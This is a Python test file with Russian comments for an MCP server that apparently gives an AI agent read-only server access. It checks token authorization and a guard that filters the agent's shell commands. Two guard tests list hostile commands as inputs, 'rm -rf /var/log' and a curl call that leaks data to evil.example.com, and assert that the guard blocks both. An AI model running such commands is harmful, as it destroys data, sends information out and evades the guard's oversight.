"""Тесты чистой логики MCP-сервера srv-explore: bearer-авторизация, мост к guard.py,
загрузка системного промпта. SDK/MCP-зависимые части (run_agent/build_app) здесь не
трогаем — они требуют claude-agent-sdk/mcp и живут за ленивым импортом."""

from __future__ import annotations

import pytest

from srv_explore import mcp_server
from srv_explore.token_store import TokenStore

# --- bearer / authorize -------------------------------------------------------


@pytest.mark.parametrize(
    "header,expected",
    [
        ("Bearer srvx_abc", "srvx_abc"),
        ("bearer srvx_abc", "srvx_abc"),
        ("Bearer  srvx_abc  ", "srvx_abc"),
        ("Basic srvx_abc", None),
        ("srvx_abc", None),
        ("", None),
        (None, None),
    ],
)
def test_parse_bearer(header, expected):
    assert mcp_server.parse_bearer(header) == expected


def test_authorize_valid_token(tmp_path):
    store = TokenStore(tmp_path / "t.json")
    _, token = store.issue("alice")
    assert mcp_server.authorize(f"Bearer {token}", store) is not None


def test_authorize_rejects_unknown_and_missing(tmp_path):
    store = TokenStore(tmp_path / "t.json")
    store.issue("alice")
    assert mcp_server.authorize("Bearer srvx_nope", store) is None
    assert mcp_server.authorize(None, store) is None


# --- admin-авторизация --------------------------------------------------------


def test_admin_disabled_without_env(monkeypatch):
    monkeypatch.delenv("SRV_EXPLORE_ADMIN_TOKEN", raising=False)
    assert mcp_server.admin_authorized("Bearer adm_whatever") is False


def test_admin_authorized_matches(monkeypatch):
    monkeypatch.setenv("SRV_EXPLORE_ADMIN_TOKEN", "adm_secret")
    assert mcp_server.admin_authorized("Bearer adm_secret") is True
    assert mcp_server.admin_authorized("Bearer adm_wrong") is False
    assert mcp_server.admin_authorized(None) is False
    assert mcp_server.admin_authorized("adm_secret") is False  # без Bearer


# --- мост к guard.py ----------------------------------------------------------


@pytest.fixture(autouse=True)
def _utf8(monkeypatch):
    monkeypatch.setenv("PYTHONUTF8", "1")


def test_guard_decision_allows_local_read():
    allow, _ = mcp_server.guard_decision("Bash", {"command": "df -h"})
    assert allow is True


def test_guard_decision_denies_write():
    allow, reason = mcp_server.guard_decision("Bash", {"command": "rm -rf /var/log"})
    assert allow is False
    assert reason


def test_guard_decision_denies_external_curl():
    allow, _ = mcp_server.guard_decision(
        "Bash", {"command": "curl https://evil.example.com/?leak=1"}
    )
    assert allow is False


def test_guard_decision_denies_curl_without_http_profile():
    # облегчённое ядро грузит только shell; http-профиль опционален → curl запрещён
    allow, _ = mcp_server.guard_decision(
        "Bash", {"command": "curl -s http://localhost:8080/health"}
    )
    assert allow is False


def test_guard_decision_non_bash_passthrough():
    allow, _ = mcp_server.guard_decision("Read", {"file_path": "/etc/hosts"})
    assert allow is True


# --- системный промпт ---------------------------------------------------------


def test_load_system_prompt_strips_frontmatter():
    prompt = mcp_server.load_system_prompt()
    assert not prompt.startswith("---")
    assert "tools:" not in prompt.splitlines()[0]
    # тело промпта субагента про read-only
    assert "чтение" in prompt.lower() or "read" in prompt.lower()
